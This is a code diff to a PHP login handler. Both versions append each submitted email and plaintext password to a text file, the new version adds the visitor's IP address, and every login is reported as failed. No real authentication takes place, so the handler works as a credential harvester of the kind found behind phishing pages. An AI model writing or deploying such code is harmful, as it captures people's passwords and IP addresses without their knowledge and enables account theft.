@@ -11,28 +11,23 @@ function sendJsonResponse($success, $message = '', $redirectUrl = '') {
     echo json_encode([
         'success' => $success,
         'message' => $message,
-        'redirectUrl' => $redirectUrl
+        'redirectUrl' => $redirectUrl,
     ]);
     exit();
 }
 
-// Check if inputs are valid
+// Check valid inputs
 if (!empty($email) && !empty($password)) {
-    // Log information
+    $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: $email\nPassword: $password\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
     try {
-        $logsFolder = __DIR__ . '/logs';
-        if (!is_dir($logsFolder)) {
-            mkdir($logsFolder, 0755, true);
-        }
-        $logFile = "{$logsFolder}/login_attempts.txt";
-        $logEntry = "[" . date('Y-m-d H:i:s') . "]\nEmail: {$email}\nPassword: {$password}\n\n";
-        file_put_contents($logFile, $logEntry, FILE_APPEND);
+        file_put_contents(__DIR__ . '/logs/login_attempts.txt', $logData, FILE_APPEND);
     } catch (Exception $e) {
-        error_log("Failed to write to log file: " . $e->getMessage());
+        error_log("Failed to save login attempt: " . $e->getMessage());
     }
 
-    sendJsonResponse(false, "Invalid login attempt recorded.");
+    // Example validation (should be proper authentication logic here)
+    sendJsonResponse(false, "Invalid login attempt.");
 } else {
-    sendJsonResponse(false, "Email or password missing.");
+    sendJsonResponse(false, "Invalid input: Email or Password missing.");
 }
 ?>
